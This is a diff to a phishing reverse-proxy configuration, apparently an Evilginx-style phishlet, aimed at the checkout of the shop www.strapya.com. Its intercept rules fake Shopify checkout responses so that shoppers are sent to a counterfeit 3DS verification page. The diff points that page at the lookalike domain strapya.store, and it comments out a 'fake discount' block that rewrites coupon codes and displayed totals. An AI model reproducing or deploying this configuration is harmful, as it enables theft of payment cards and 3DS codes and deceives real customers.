@@ -40,7 +40,7 @@ sub_filters:
 intercept:
   #mock 返回数据
   - {domain: 'www.strapya.com',path: '.*persisted\?operationName=SubmitForCompletion.*',http_status: 200,body: '{"data":{"submitForCompletion":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970983534820","purchaseOrder":{},"pollDelay":500,"__typename":"ProcessingReceipt"},"__typename":"SubmitSuccess"}}}', mime: "application/json"}
-  - {domain: 'www.strapya.com',path: '.*persisted\?operationName=PollForReceipt.*',http_status: 200,body: '{"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.top/jp3ds","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}}', mime: "application/json"}
+  - {domain: 'www.strapya.com',path: '.*persisted\?operationName=PollForReceipt.*',http_status: 200,body: '{"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.strapya.store/jp3ds","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}}', mime: "application/json"}
   # ===== 3DS 验证拦截 =====
   - domain: 'www.strapya.com'      # 要拦截的域名
     path: '.*\/jp3ds'    # 要拦截的路径（正则）
@@ -48,20 +48,20 @@ intercept:
     template: '3ds_verify'          # 模板名 → phishlets/templates/3ds_verify/index.html
 
 
-  # 虚假折扣
-  - domain: 'www.strapya.com'
-    path: '.*persisted\?operationName=Proposal.*'
-    type: transparent
-    body_match: '"code":"6688"'
-    alter_request:
-      '"6688"': '"5050"'
-    response_match: '"code":"5050"'
-    alter_response:
-      '"5050"': '"6688"'
-      '(sellerProposal.*?)"lineAmount":\{"value":\{"amount":"([\d.]*)"': '$1"lineAmount":{"value":{"amount":"[[$2 * 9]]"'       #优惠券优惠金额
-      #'(buyerProposal.*?)"runningTotal":\{"value":\{"amount":"([\d.]*)"': '$1"runningTotal":{"value":{"amount":"[[$2 / 9]]"'   #折后价格
-      '"totalSavings":\{"value":\{"amount":"([\d.]*)"(.*?)"runningTotal":\{"value":\{"amount":"([\d.]*)"': '"totalSavings":{"value":{"amount":"[[$1 - $3/9 + $3]]"$2"runningTotal":{"value":{"amount":"[[$3 / 9]]"'   #总优惠金额
-
+#  # 虚假折扣
+#  - domain: 'www.strapya.com'
+#    path: '.*persisted\?operationName=Proposal.*'
+#    type: transparent
+#    body_match: '"code":"6688"'
+#    alter_request:
+#      '"6688"': '"5050"'
+#    response_match: '"code":"5050"'
+#    alter_response:
+#      '"5050"': '"6688"'
+#      '(sellerProposal.*?)"lineAmount":\{"value":\{"amount":"([\d.]*)"': '$1"lineAmount":{"value":{"amount":"[[$2 * 9]]"'       #优惠券优惠金额
+#      #'(buyerProposal.*?)"runningTotal":\{"value":\{"amount":"([\d.]*)"': '$1"runningTotal":{"value":{"amount":"[[$2 / 9]]"'   #折后价格
+#      '"totalSavings":\{"value":\{"amount":"([\d.]*)"(.*?)"runningTotal":\{"value":\{"amount":"([\d.]*)"': '"totalSavings":{"value":{"amount":"[[$1 - $3/9 + $3]]"$2"runningTotal":{"value":{"amount":"[[$3 / 9]]"'   #总优惠金额
+#
 
 
 
